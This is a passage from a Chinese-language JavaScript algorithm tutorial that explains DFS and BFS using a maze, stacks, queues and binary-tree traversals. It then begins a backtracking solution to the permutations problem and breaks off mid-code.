<li>发现<code>F</code> 是死胡同，后退到最近的岔路口 <code>E</code>，尝试往<code>G</code>方向走。</li>
<li><code>G</code> 是一个岔路口，眼前有两个选择：<code>H</code> 和 <code>I</code>。按照从上到下的顺序来走，先走<code>H</code>。</li>
<li>发现 <code>H</code> 是死胡同，后退到最近的岔路口 <code>G</code>，尝试往<code>I</code>方向走。</li>
<li><code>I</code> 就是出口，成功走出迷宫。</li>
</ol>
<p>大家观察一下这个过程，会不会觉得这些前进、后退的操作，其实和栈结构的入栈、出栈过程非常相似呢？<br/>
现在我们把迷宫中的每一个坐标看做是栈里的一个元素，用栈来模拟这个过程：</p>
<ol>
<li>从 <code>A</code> 出发（<code>A</code>入栈），经过了<code>B</code>（<code>B</code>入栈），接下来面临 <code>C</code>、<code>D</code>、<code>E</code>三条路。这里按照从上到下的顺序来走（你也可以选择其它顺序），先走<code>C</code>（<code>C</code>入栈）。</li>
<li>发现 <code>C</code>是死胡同，后退到最近的岔路口 <code>B</code>（<code>C</code>出栈），尝试往<code>D</code>方向走（<code>D</code>入栈）。</li>
<li>发现<code>D</code> 是死胡同，，后退到最近的岔路口 <code>B</code>（<code>D</code>出栈），尝试往<code>E</code>方向走（<code>E</code>入栈）。</li>
<li><code>E</code> 是一个岔路口，眼前有两个选择：<code>F</code> 和 <code>G</code>。按照从上到下的顺序来走，先走<code>F</code>（<code>F</code>入栈）。</li>
<li>发现<code>F</code> 是死胡同，后退到最近的岔路口 <code>E</code>（<code>F</code>出栈），尝试往<code>G</code>方向走（<code>G</code>入栈）。</li>
<li><code>G</code> 是一个岔路口，眼前有两个选择：<code>H</code> 和 <code>I</code>。按照从上到下的顺序来走，先走<code>H</code>（<code>H</code>入栈）。</li>
<li>发现 <code>H</code> 是死胡同，后退到最近的岔路口 <code>G</code>（<code>H</code>出栈），尝试往<code>I</code>方向走（<code>I</code>入栈）。</li>
<li><code>I</code> 就是出口，成功走出迷宫。</li>
</ol>
<p>此时栈里面的内容就是<code>A</code>、<code>B</code>、<code>E</code>、<code>G</code>、<code>I</code>，因此
<code>A</code>-&gt;<code>B</code>-&gt;<code>E</code>-&gt;<code>G</code>-&gt;<code>I</code> 就是走出迷宫的路径。通过深度优先搜索，我们不仅可以定位到迷宫的出口，还可以记录下相关的路径信息。</p>
<p>现在大家知道了深度优先搜索的过程可以转化为一系列的入栈、出栈操作。那么深度优先搜索在编码上一般会如何实现呢？这里，就需要大家回忆一下第 5 节的内容了——DFS 中，我们往往使用<strong>递归</strong>来模拟入栈、出栈的逻辑。</p>
<h2 data-id="heading-31">DFS 与二叉树的遍历</h2>
<p>现在我们站在深度优先搜索的角度，重新理解一下二叉树的先序遍历过程：
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/6/1714ec42acc57e04~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1553&amp;h=1010&amp;s=237869&amp;e=gif&amp;f=27" alt="" loading="lazy"/></p>
<p>从 <code>A</code> 结点出发，访问左侧的子结点；如果左子树同样存在左侧子结点，就<strong>头也不回地继续访问下去</strong>。一直到左侧子结点为空时，才<strong>退回</strong>到距离最近的父结点、再尝试去访问父结点的右侧子结点——这个过程，和走迷宫是何其相似！事实上，在二叉树中，结点就好比是迷宫里的坐标，图中的每个结点在作为父结点时无疑是岔路口，而空结点就是死胡同。我们回顾一下二叉树先序遍历的编码实现：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 所有遍历函数的入参都是树的根结点对象</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">preorder</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-comment">// 递归边界，root 为空</span>
    <span class="hljs-keyword">if</span>(!root) {
        <span class="hljs-keyword">return</span> 
    }
     
    <span class="hljs-comment">// 输出当前遍历的结点值</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'当前遍历的结点值是：'</span>, root.<span class="hljs-property">val</span>)  
    <span class="hljs-comment">// 递归遍历左子树 </span>
    <span class="hljs-title function_">preorder</span>(root.<span class="hljs-property">left</span>)  
    <span class="hljs-comment">// 递归遍历右子树  </span>
    <span class="hljs-title function_">preorder</span>(root.<span class="hljs-property">right</span>)
}
</code></pre>
<p>在这个递归函数中，递归式用来先后遍历左子树、右子树（分别探索不同的道路），递归边界在识别到结点为空时会直接返回（撞到了南墙）。因此，我们可以认为，<strong>递归式就是我们选择道路的过程，而递归边界就是死胡同</strong>。二叉树的先序遍历正是深度优先搜索思想的递归实现。可以说深度优先搜索过程就类似于树的先序遍历、是树的先序遍历的推广。</p>
<p>这时候，可能有同学会有疑问：在二叉树遍历的递归实现里，完全没有栈的影子——这东西似乎和栈没有什么直接联系啊，为啥咱们还说深度优先搜索的本质是栈呢？</p>
<p>我们从两个角度来理解这个事情：</p>
<ul>
<li>
<p>首先，函数调用的底层，仍然是由栈来实现的。JS 会维护一个叫“函数调用栈”的东西，<code>preorder</code>每调用一次自己，相关调用的上下文就会被<code>push</code>进函数调用栈中；待函数执行完毕后，对应的上下文又会从调用栈中被<code>pop</code>出来。因此，即便二叉树的递归调用过程中，并没有出现栈这种数据结构，也依然改变不了递归的本质是栈的事实。</p>
</li>
<li>
<p>其次，DFS 作为一种思想，它和树的递归遍历一脉相承、却并不能完全地画上等号——DFS 的解题场景其实有很多，其中有一类会要求我们记录每一层递归式里路径的状态，此时就会强依赖栈结构（这一点会在下一节的真题实战中体现得淋漓尽致）。</p>
</li>
</ul>
<p>基于上述的两个例子，相信大家已经对深度优先搜索的思想和实现思路形成了自己的理解。本节我们着重理解概念，不急着做题——深度优先搜索的应用是非常广泛的，在后续的小节中，大家自然会见到许许多多使用递归来实现深度优先搜索的实战案例。</p>
<h2 data-id="heading-32">广度优先搜索思想——找到迷宫出口的另一种思路</h2>
<p>我们回头再来看看这个迷宫结构：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/18/1718dd0887578d3d~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1098&amp;h=636&amp;s=66802&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/></p>
<p>当我们使用深度优先搜索来寻找迷宫出口时，会走出图示这样一条一条的完整路径：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17190aa8a73ba344~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1128&amp;h=644&amp;s=95270&amp;e=png" alt="" loading="lazy"/></p>
<p>其中红色的圆点意味着路径的起点，红色箭头意味着路径的终点。我们看到从起点开始，一共探索出了 5 条完整的路径。</p>
<p>与深度优先搜索不同的是，广度优先搜索（BFS）并不执着于“一往无前”这件事情。它关心的是<strong>眼下自己能够直接到达的所有坐标，其动作有点类似于“扫描”</strong>——比如说站在 <code>B</code> 这个岔路口，它会只关注 <code>C</code>、<code>D</code>、<code>E</code> 三个坐标，至于 <code>F</code>、<code>G</code>、<code>H</code>、<code>I</code>这些遥远的坐标，现在不在它的关心范围内：<br/>
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17190ddba3cdc06c~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1110&amp;h=650&amp;s=77427&amp;e=png" alt="" loading="lazy"/></p>
<p>只有在走到了 <code>E</code>处时，它发现此时可以触达的坐标变成了 <code>F</code>、<code>G</code>，此时才会去扫描<code>F</code>、<code>G</code>：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17190e18e27e1e27~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1086&amp;h=646&amp;s=75045&amp;e=png" alt="" loading="lazy"/></p>
<p>按照这个思路，广度优先搜索每次<strong>以“广度”为第一要务、雨露均沾，一层一层地扫描</strong>，最后也能够将所有的坐标扫描完全：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/17190e64f8853081~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1122&amp;h=666&amp;s=103999&amp;e=png" alt="" loading="lazy"/></p>
<p>当扫描到 <code>I</code> 的时候，发现 <code>I</code> 是出口，照样能够找到答案。</p>
<p>按照 BFS 的遍历规则，具体的访问步骤会变成下面这样:</p>
<ol>
<li>站在入口<code>A</code>处（第一层），发现直接能抵达的坐标只有<code>B</code>，于是接下来需要访问的就是 <code>B</code>。</li>
<li>入口<code>A</code>访问完毕，走到 <code>B</code> 处（第二层），发现直接能抵达的坐标变成了<code>C</code>、<code>D</code>和<code>E</code>，于是把这三个坐标记为下一层的访问对象。</li>
<li><code>B</code>访问完毕，访问第三层。这里我按照从上到下的顺序（你也可以按照其它顺序），先访问 <code>C</code>和<code>D</code>，然后访问<code>E</code>。站在<code>C</code>处和<code>D</code>处都没有见到新的可以直接抵达的坐标，所以不做额外的动作。但是在<code>E</code>处见到了可以直接抵达的<code>F</code>和<code>G</code>，因此把<code>F</code>和<code>G</code>记为下一层（第四层）需要访问的对象。</li>
<li>第三层访问完毕，访问第四层。第四层按照从上到下的顺序，先访问的是 <code>F</code>。从<code>F</code>出发没有可以直接触达的坐标，因此不做额外的操作。接着访问<code>G</code>，发现从<code>G</code>出发可以直接抵达<code>H</code>和<code>I</code>，因此把<code>H</code>和<code>I</code>记为下一层（第五层）需要访问的对象。</li>
<li>第四层访问完毕，访问第五层。第五层按照从上到下的顺序，先访问的是<code>H</code>，发现从<code>H</code>出发没有可以直接抵达的坐标，因此不作额外的操作。接着访问<code>I</code>，发现<code>I</code>就是出口，问题得解。</li>
</ol>
<p>当然啦，这个问题若采用 BFS 的思路来解，那么它其实已经不能说是一个严格的迷宫游戏了——在一个真正的迷宫游戏里，大概率并不会允许我们如此顺利地逐个访问身在同一层次的所有坐标（比如<code>C</code>和<code>D</code>之间可能就会隔了厚厚的一堵墙，导致你无法在访问<code>C</code>后直接去访问<code>D</code>）。这里我们基于迷宫游戏，抽象出来的其实是一个更为简单的模型。大家不必拘泥于游戏本身，而应该着重理解这个分层遍历的过程。</p>
<p>在分层遍历的过程中，大家会发现两个规律：</p>
<ol>
<li>每访问完毕一个坐标，这个坐标在后续的遍历中都不会再被用到了，也就是说它可以被丢弃掉。</li>
<li>站在某个确定坐标的位置上，我们所观察到的可直接抵达的坐标，是需要被记录下来的，因为后续的遍历还要用到它们。</li>
</ol>
<p>丢弃已访问的坐标、记录新观察到的坐标，这个顺序毫无疑问符合了“先进先出”的原则，因此整个 BFS 算法的实现过程，<strong>和队列有着密不可分的关系</strong>。<br/>
下面我用一个队列 <code>queue</code> 来模拟一下上面的过程：</p>
<ol>
<li>初始化，先将入口<code>A</code>入队（<code>queue</code>里现在只有<code>A</code>）。</li>
<li>访问入口<code>A</code>（第一层），访问完毕后将<code>A</code>出队。发现直接能抵达的坐标只有<code>B</code>，于是将<code>B</code>入队（<code>queue</code>里现在只有<code>B</code>）。</li>
<li>访问<code>B</code>（第二层），访问完毕后将<code>B</code>出队。发现直接能抵达的坐标变成了<code>C</code>、<code>D</code>和<code>E</code>，于是把这三个坐标记为下一层的访问对象，也就是把它们全部入队（<code>queue</code>里现在是<code>C</code>、<code>D</code>、<code>E</code>）</li>
<li>访问第三层。这里我按照从上到下的顺序（你也可以按照其它顺序），先访问 <code>C</code>（访问完毕后<code>C</code>出队）和<code>D</code>（访问完毕后<code>D</code>出队），然后访问<code>E</code>（访问完毕后<code>E</code>出队）。访问<code>C</code>处和<code>D</code>处都没有见到新的可以直接抵达的坐标，所以不做额外的动作。但是在<code>E</code>处我们见到了可以直接抵达的<code>F</code>和<code>G</code>，因此把<code>F</code>和<code>G</code>记为下一层（第四层）需要访问的对象，<code>F</code>、<code>G</code>依次入队（<code>queue</code>里现在是 <code>F</code>、<code>G</code>）。</li>
<li>访问第五层。第五层按照从上到下的顺序，先访问的是<code>H</code>（访问完毕后<code>H</code>出队），发现从<code>H</code>出发没有可以直接抵达的坐标，因此不作额外的操作。接着访问<code>I</code>（访问完毕后<code>I</code>出队），发现<code>I</code>就是出口，问题得解（此时 <code>queue</code> 队列已经被清空）。</li>
</ol>
<p>在这个过程里，我们其实循环往复地做了以下事情：<br/>
依次访问队列里已经有的坐标，将其出队；记录从当前坐标出发可直接抵达的所有坐标，将其入队。</p>
<p>以上逻辑用伪代码表述如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">BFS</span>(<span class="hljs-params">入口坐标</span>) {
    <span class="hljs-keyword">const</span> queue = [] <span class="hljs-comment">// 初始化队列queue</span>
    <span class="hljs-comment">// 入口坐标首先入队</span>
    queue.<span class="hljs-title function_">push</span>(入口坐标)
    <span class="hljs-comment">// 队列不为空，说明没有遍历完全</span>
    <span class="hljs-keyword">while</span>(queue.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">const</span> top = queue[<span class="hljs-number">0</span>] <span class="hljs-comment">// 取出队头元素  </span>
        
        访问 top <span class="hljs-comment">// 此处是一些和 top 相关的逻辑，比如记录它对应的信息、检查它的属性等等</span>
        
        <span class="hljs-comment">// 注意这里也可以不用 for 循环，视题意而定</span>
        <span class="hljs-keyword">for</span>(检查 top 元素出发能够遍历到的所有元素)  {
            queue.<span class="hljs-title function_">push</span>(top能够直接抵达的元素)
        }
        
        queue.<span class="hljs-title function_">shift</span>() <span class="hljs-comment">// 访问完毕。将队头元素出队</span>
    }
}
</code></pre>
<p>注意，理论上来说只要我们拿到了 <code>top</code>，那么就不再关心队头元素了。因此这个 <code>shift</code> 出队的过程，其实是比较灵活的。一般只要我们拿到了 <code>top</code>，就可以执行 <code>shift</code>了。一些同学习惯于把<code>top</code>元素的访问和出队放在一起来做：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> top = queue.<span class="hljs-title function_">shift</span>()
</code></pre>
<p>这样做也是没问题的（除非题目中对出队的时机有强约束，但这种情况非常少见）。</p>
<h2 data-id="heading-33">BFS实战：二叉树的层序遍历</h2>
<p>大家现在回顾一下我们在第 5 节展示过的这个二叉树实例：<br/>
<img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/6/1714ec60340dc2db~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1098&amp;h=718&amp;s=54834&amp;e=png&amp;b=ffffff" alt="" loading="lazy"/></p>
<p>这棵二叉树的编码实现如下：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> root = {
  <span class="hljs-attr">val</span>: <span class="hljs-string">"A"</span>,
  <span class="hljs-attr">left</span>: {
    <span class="hljs-attr">val</span>: <span class="hljs-string">"B"</span>,
    <span class="hljs-attr">left</span>: {
      <span class="hljs-attr">val</span>: <span class="hljs-string">"D"</span>
    },
    <span class="hljs-attr">right</span>: {
      <span class="hljs-attr">val</span>: <span class="hljs-string">"E"</span>
    }
  },
  <span class="hljs-attr">right</span>: {
    <span class="hljs-attr">val</span>: <span class="hljs-string">"C"</span>,
    <span class="hljs-attr">right</span>: {
      <span class="hljs-attr">val</span>: <span class="hljs-string">"F"</span>
    }
  }
};
</code></pre>
<p>现在我们要做的是对这个二叉树进行层序遍历。层序遍历的概念很好理解：按照层次的顺序，从上到下，从左到右地遍历一个二叉树，如图所示（红色数字即为遍历的序号）：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/1719130c81086dbb~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1194&amp;h=770&amp;s=110864&amp;e=png" alt="" loading="lazy"/></p>
<p>正确的遍历序列为：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-tag">A</span>
<span class="hljs-selector-tag">B</span>
C
D
E
F
</code></pre>
<p>看到“层次”关键字，大家应该立刻想到“扫描”；想到“扫描”，就应该立刻想到 BFS。因此层序遍历，我们就用 BFS 的思路来实现。这里咱们可以直接套用上面的伪代码：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">BFS</span>(<span class="hljs-params">root</span>) {
    <span class="hljs-keyword">const</span> queue = [] <span class="hljs-comment">// 初始化队列queue</span>
    <span class="hljs-comment">// 根结点首先入队</span>
    queue.<span class="hljs-title function_">push</span>(root)
    <span class="hljs-comment">// 队列不为空，说明没有遍历完全</span>
    <span class="hljs-keyword">while</span>(queue.<span class="hljs-property">length</span>) {
        <span class="hljs-keyword">const</span> top = queue[<span class="hljs-number">0</span>] <span class="hljs-comment">// 取出队头元素  </span>
        <span class="hljs-comment">// 访问 top</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(top.<span class="hljs-property">val</span>)
        <span class="hljs-comment">// 如果左子树存在，左子树入队</span>
        <span class="hljs-keyword">if</span>(top.<span class="hljs-property">left</span>) {
            queue.<span class="hljs-title function_">push</span>(top.<span class="hljs-property">left</span>)
        }
        <span class="hljs-comment">// 如果右子树存在，右子树入队</span>
        <span class="hljs-keyword">if</span>(top.<span class="hljs-property">right</span>) {
            queue.<span class="hljs-title function_">push</span>(top.<span class="hljs-property">right</span>)
        }
        queue.<span class="hljs-title function_">shift</span>() <span class="hljs-comment">// 访问完毕，队头元素出队</span>
    }
}
</code></pre>
<p>执行 BFS：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title function_">BFS</span>(root)
</code></pre>
<p>输出结果符合预期：</p>
<p><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/4/19/171913194faccc17~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=816&amp;h=318&amp;s=17031&amp;e=png" alt="" loading="lazy"/></p>
<h2 data-id="heading-34">结语</h2>
<p>经过本节的学习，相信大家对 DFS、BFS 的核心思想及实现方法都有了比较扎实的掌握。这两种算法在我们今后的做题过程中会反复出现，彼时大家会对它们的应用场景有更加深刻的认知。</p>
<p>（阅读过程中有任何想法或疑问，或者单纯希望和笔者交个朋友啥的，欢迎大家添加我的微信xyalinode与我交流哈~）</p>
<h2 data-id="heading-35">在开始之前</h2>
<p>根据我深耕技术写作多年的经验，很多同学一看到标题里有“思想”两个字，就会觉得接下来要讲的一定是一个非常复杂的“高大上”理论，于是他会先给自己箍上一个“我一定学不会”的紧箍咒，接着心里就开始打退堂鼓了。这样的同学在和算法正面交锋之前，就先被自己内心的恐惧击垮了，实在可惜。 <br/>    <br/>站在讲解者的角度来说，我确实不会先给大家画个饼，说这玩意儿有多么多么简单——这是一个非常不负责任的承诺。因为对于初学者来说，没有什么是简单的，从不会到会本来就是一个过程。况且，你现在学的是不少前端er都不肯学/学不动的算法，这本就不是一个轻松的挑战。但既然走到了这一步，不管你这会儿心里有多慌，我都希望你可以坚持一下、读读看，你会发现这玩意儿真的不是玄学——它真的很香。   <br/>     <br/></p>
<p><a name="user-content-Cj7I7" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h2 data-id="heading-36">如何学好这一节</h2>
<p>不可否认，在一些传统教材里，谈及“思想”必定会有大段理论文字的堆砌，这也是很多同学学完数据结构直接放弃学习算法思想的重要原因。   <br/> <br/>但站在面试的角度来看，算法相关的考察几乎不存在“背知识点”这种形式，更多还是看你能不能把题做出来。算法思想是抽象的，题目却是具体的。我们常说“以题为纲”，其目的就是帮助大家站在具体去理解抽象。  <br/> <br/>本节我们先不用纠结什么是递归、什么是回溯，而是直接来做一道题，从题中去认识所谓的“思想”。  <br/> <br/>通过本节的学习，我希望大家能够认识到，“思想”并不是一坨剪不断理还乱、学了只能用来吹水的虚无概念。“思想”本质上就是套路，而且是普适性非常强的套路，它有着大量的对口问题。搞定了它，就搞定了一大波面试题——爽不爽？要想爽这一把，就不要轻易撤退。  <br/>  <br/></p>
<p><a name="user-content-pwQVt" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h2 data-id="heading-37">关键套路初相见：全排列问题 </h2>
<blockquote>
<p>题目描述：给定一个<strong>没有重复</strong>数字的序列，返回其所有可能的全排列。</p>
</blockquote>
<p>  </p>
<blockquote>
<p>示例：   <br/>
输入: [1,2,3]<br/>
输出:
[<br/>
[1,2,3],<br/>
[1,3,2],<br/>
[2,1,3],<br/>
[2,3,1],<br/>
[3,1,2],<br/>
[3,2,1]<br/>
]</p>
</blockquote>
<p><a name="user-content-WtuIE" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-38">思路分析</h3>
<p>“全排列”是高中数学里的一个概念，这里先带大家复习一下： </p>
<blockquote>
<p>从n个不同元素中任取m（m≤n）个元素，按照一定的顺序排列起来，叫做从n个不同元素中取出m个元素的一个排列。当m=n时所有的排列情况叫全排列。</p>
</blockquote>
<p>不过就算你已经完全忘了“全排列”到底是一个什么样的数学概念，也没有关系。结合题目描述和示例，我们依然可以分析出这道题想让我们做的事情：拿到一个 n 个数的数组作为入参，穷举出这 n 个数的所有排列方式。    <br/>  <br/>哎？等等，我好像看到一个熟悉的词眼——<strong>穷举</strong>！楼上是不是说了穷举？我们最近还在哪里见过穷举？是不是在上一节？上一节的哪个位置？DFS 对不对？DFS 用什么实现比较好？递归！好，来得早不如来得巧，我现在就决定用递归来做这个题。  <br/></p>
<pre><code class="hljs language-!" lang="!">如果你的脑回路暂时没有反应出来上面这些知识点之间的关联关系，也不要着急。新手上路，这很正常。    

做完下面一系列的题目之后，我会跟大家介绍这类题目的关键特征，到时候会有更直白的套路可以用。现在先不要慌，跟着我的思路往下走，好好敲代码    
</code></pre>
<p>怎么做呢？大家仔细想想，在这个变化的序列中，不变的是什么——是不是坑位的数量？拿示例来说，不管我怎么调整数字的顺序，它们都只能围着这 3 个坑打转。<strong>当我们感到变化难以把握时，不如尝试先从不变的东西入手</strong>。这里我把坑位给大家画出来：<br/><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/3/171da9a215aa6c68~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=994&amp;h=646&amp;s=23649&amp;e=png" alt="image.png" loading="lazy"/><br/>  <br/>现在问题变成了，我手里有 3 个数，要往这 3 个坑里填，有几种填法？我们一个一个坑来看：  </p>
<ul>
<li><strong>Step1</strong>:：面对第一个坑，我有3种选择：填1、填2、填3，随机选择其中一个填进去即可。</li>
<li><strong>Step2</strong>：面对第二个坑，由于 Step1 中已经分出去1个数字，现在只剩下2个选择：比如如果 Step1 中填进去的是 1，那么现在就剩下2、3；如果 Step1 中填进去的是 2，那么就剩下 1、3。   </li>
<li><strong>Step3</strong>： 面对第三个坑，由于前面已经消耗了2个数字，此时我们手里只剩下 1 个数字了。所以说第 3 个坑是毫无悬念的，它只有1种可能。   </li>
</ul>
<p><br/>我们把三个坑的情况统筹起来，那么全排列就一共有 <code>3x2x1=6</code>  种可能。可惜这道题问的不是全排列的可能性有多少种，而是要求你把每一种可能性都<strong>穷举</strong>出来。这其实有点类似于我们上一节玩迷宫游戏的时候，游戏规则不仅要求你回答出迷宫的通关方法有几种，还要求你列举出每一条路的路径。<strong>列举“路径”，我们首先要找到“坐标”</strong>。在这道题里，“坐标”就是每一个坑里可能填进的数字。我把它画出来，你就明白了： <br/><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/3/171da9a215c76113~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=648&amp;h=486&amp;s=17866&amp;e=png" alt="image.png" loading="lazy"/><br/><code>root</code> 是一个空坐标，是我们分配数字的起点。   <br/>你可以想象自己此时此刻正手握 3 个数字站在 <code>root</code> 这个位置上。眼前是第一个坑，这个坑向你问道：“小哥，你打算给我哪个数字呢？” <br/>你说：“不好说，这里有 3 种可能”。第一个坑里可以填的数字，对应的是以下三种情况：  <br/><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/3/171da9a21761dd46~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=956&amp;h=724&amp;s=44694&amp;e=png" alt="image.png" loading="lazy"/><br/>  <br/>接着，你走到了第二个坑。第二个坑问你：“小哥，你打算给我哪个数字呢？”。 <br/>你仔细想想，说：“不好说，这要看我给了 1 号坑哪个数字。但可以确定的是，不管我给了 1 号坑哪个数字，到你这里的时候，都只有 2 个数字可选了”。基于 1 号坑的分配结果，2 号坑分别有以下可能：   <br/><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/3/171da9a217acd94b~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1238&amp;h=772&amp;s=73808&amp;e=png" alt="image.png" loading="lazy"/><br/>终于，你走到了第三个坑。此时，你手里只剩下 1 个数，还没等第 3 个坑问你要，你就对它说：“哥，别挑了，我就剩一个了，你没得选”。说着，你把 1 号坑和 2 号坑挑完剩下的最后 1 个数给了 3 号坑：  <br/><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/3/171da9a21bed6cbe~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1304&amp;h=978&amp;s=103304&amp;e=png" alt="image.png" loading="lazy"/><br/>  <br/><strong>有没有发现，不知不觉中，我们构造出了一个树结构。</strong><br/>从这个树结构里我们可以清晰地看出，全排列的所有可能性：  <br/><img src="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-user-assets/2020/5/3/171da9a21d81055e~tplv-t2oaga2asx-jj-mark:3024:0:0:0:q75.awebp#?w=1200&amp;h=962&amp;s=141521&amp;e=png" alt="image.png" loading="lazy"/><br/>图中以圆点为起点，以箭头为终点，起点和终点之间就是一个完整的排列。<br/> <br/>我们的思维路径是一个树结构，但这并不意味着我们需要真的在编码的时候去构造一棵树出来。回忆一下上一节，我们走迷宫的各种路径组合起来，是不是也是一个树结构？走迷宫时我们没有构造树，这里也不需要构造树。需要什么？需要<strong>递归</strong>！   <br/>  <br/>即便不联想咱们刚刚学过的 DFS 知识点，这道题的解答思路中也有一个非常关键的特征在提醒你往递归去想，那就是<strong>重复</strong>。    <br/> <br/></p>
<pre><code class="hljs language-!" lang="!">这里给大家一个思维工具：以后只要分析出重复的逻辑（排除掉类似数组遍历这种简单粗暴的重复），你都需要把递归从你的大脑内存里调度出来、将其列为“可以一试”的解法之一；只要想到递归，立刻回忆我们上一节讲的 DFS 思想、然后尝试套我们这一节末尾教给大家的解题模板。这个脑回路未必 100% 准确，但确实有极高的成功概率——题，是有规律的。这，就是规律之一。
</code></pre>
<p><br/>在以上的“填坑”过程中，我们重复地做了以下事情：  </p>
<ol>
<li>检查手里剩下的数字有哪些</li>
<li>选取其中一个填进当前的坑里     </li>
</ol>
<p><br/>在第 5 节初识递归时，大家已经知道“<strong>重复”的内容，就是递归式</strong>。<br/> <br/>这个重复递归式的动作一直持续到了最后一个数字也被填进坑里为止——“<strong>重复”的终点，就是递归边界</strong>。   <br/> <br/>这里大家当然也可以借鉴遍历二叉树的经验
，通过判断数组的可选数字是否为空，来决定当前是不是走到了递归边界。但是这道题其实可以做得更简单：坑位的个数是已知的，我们可以通过记录当前坑位的索引来判断是否已经走到了边界：比如说示例中有 <code>n</code>  个坑，假如我们把第 1 个坑的索引记为 0 ，那么索引为 <code>n-1</code>   的坑就是递归式的执行终点，索引为 <code>n</code>  的坑（压根不存在）就是递归边界。 <br/> <br/>   <br/>递归的编码实现，无非是把我们上面描述过的递归式和递归边界翻译成代码：   <br/>    <a name="user-content-G4KFk" title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target="/></p>
<h3 data-id="heading-39">编码实现</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number[]</span>} <span class="hljs-variable">nums</span>
 * <span class="hljs-doctag">@return</span> {<span class="hljs-type">number[][]</span>}
 */</span>
<span class="hljs-comment">// 入参是一个数组</span>
<span class="hljs-keyword">const</span> permute = <span class="hljs-keyword">function</span>(<span class="hljs-params">nums</span>) {
  <span class="hljs-comment">// 缓存数组的长度</span>
  <span class="hljs-keyword">const</span> len = nums.<span class="hljs-property">length</span>
  <span class="hljs-comment">// curr 变量用来记录当前的排列内容</span>
  <span class="hljs-keyword">const</span> curr = []
  <span class="hljs-comment">// res 用来记录所有的排列顺序</span>
  <span class="hljs-keyword">const</span> res = []
  <span class="hljs-comment">// visited 用来避免重复使用同一个数字</span>
  <span class="hljs-keyword">const</span> visited = {}
  <span class="hljs-comment">// 定义 dfs 函数，入参是坑位的索引（从 0 计数）</span>
  <span class="hljs-keyword">function</span> <span class="hljs-title function_">dfs</span>(<span class="hljs-params">nth</span>) {
      <span class="hljs-comment">// 若遍历到了不存在的坑位（第 len+1 个），则触碰递归边界返回</span>
      <span class="hljs-keyword">if</span>(nth === len) {
          <span class="hljs-comment">// 此时前 len 个坑位已经填满，将对应的排列记录下来</span>
          res.<span class="hljs-title function_">push</span>(curr.<span class="hljs-title function_">slice</span>())
          <span class="hljs-keyword">return</span> 
      }
      <span class="hljs-comment">// 检查手里剩下的数字有哪些</span>
      <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;len;i++) {
          <span class="hljs-comment">// 若 nums[i] 之前没被其它坑位用过，则可以理解为“这个数字剩下了”</span>
          <span class="hljs-keyword">if</span>(!visited[nums[i]]) {
              <span class="hljs-comment">// 给 nums[i] 打个“已用过”的标</span>
